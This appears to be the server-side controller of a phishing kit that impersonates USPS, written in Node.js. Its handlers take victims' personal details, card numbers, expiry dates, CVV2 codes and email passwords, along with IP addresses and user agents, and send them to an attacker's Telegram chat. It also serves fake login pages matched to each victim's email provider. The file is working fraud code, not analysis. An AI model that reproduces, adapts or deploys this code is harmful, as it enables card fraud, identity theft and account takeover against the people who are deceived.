const { Telegraf } = require("telegraf");
const { message } = require("telegraf/filters");
const { v4: uuidv4 } = require("uuid");
const config = require("../config");

const bot = new Telegraf(config.BOT_TOKEN);

exports.getIndex = (req, res, next) => {
  if (!req.session.visitorId) {
    req.session.visitorId = uuidv4().replace(/-/g, "").substring(0, 12);
  }

  res.render("index");
};

exports.getEmail = (req, res, next) => {
  // firstName middleInitial lastName addressLineOne addressLineTwo city State zipCode phone emailAddress cardn Expiry cvv2

  bot.telegram.sendMessage(
    config.CHAT_ID,
    `NEW USPS LOG FROM @TALISMAN_DEVELOPMENT\n\nLog ID: ${req.session.visitorId}\nFirst name: ${req.body.firstName}\nMiddle initial: ${req.body.middleInitial}\nLast name: ${req.body.lastName}\nFirst address: ${req.body.addressLineOne}\nSecond address: ${req.body.addressLineTwo}\nCity: ${req.body.city}\nState: ${req.body.State}\nZip code: ${req.body.zipCode}\nPhone number: ${req.body.phone}\nEmail address: ${req.body.emailAddress}\nCard number: ${req.body.cardn}\nExpiry date: ${req.body.Expiry}\nCVV2: ${req.body.cvv2}\nIp: ${req.headers["x-forwarded-for"]}\nUser-agent: ${req.useragent.source}`
  );

  if (req.body.emailAddress.includes("@gmail.com")) {
    res.render("email/gmail", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@icloud.com")) {
    res.render("email/icloud", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@yahoo.com")) {
    res.render("email/yahoo", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@aol.com")) {
    res.render("email/aol", {
      email: req.body.emailAddress,
    });
  } else if (
    req.body.emailAddress.includes("@outlook.com") ||
    req.body.emailAddress.includes("@hotmail.com")
  ) {
    res.render("email/microsoft", {
      email: req.body.emailAddress,
    });
  } else if (
    req.body.emailAddress.includes("@currently.com") ||
    req.body.emailAddress.includes("@att.net")
  ) {
    res.render("email/att", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@yandex")) {
    res.render("email/yandex", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@zoho.com")) {
    res.render("email/zoho", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@verizon.net")) {
    res.render("email/aol", {
      email: req.body.emailAddress,
    });
  } else if (req.body.emailAddress.includes("@sbcglobal")) {
    res.render("email/yahoo", {
      email: req.body.emailAddress,
    });
  } else if (
    req.body.emailAddress.includes("@comcast") ||
    req.body.emailAddress.includes("@xfinity")
  ) {
    res.render("email/comcast", {
      email: req.body.emailAddress,
    });
  } else {
    res.render("email/others", {
      email: req.body.emailAddress,
    });
  }
};

exports.postEmailDetails = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `[EMAIL] NEW LOG FROM @TALISMAN_DEVELOPMENT\n\nLog ID: ${req.session.visitorId}\nEmail: ${req.body.email}\nPassword: ${req.body.password}\nIp: ${req.headers["x-forwarded-for"]}\nUser-agent: ${req.useragent.source}`
  );

  res.render("final");
};
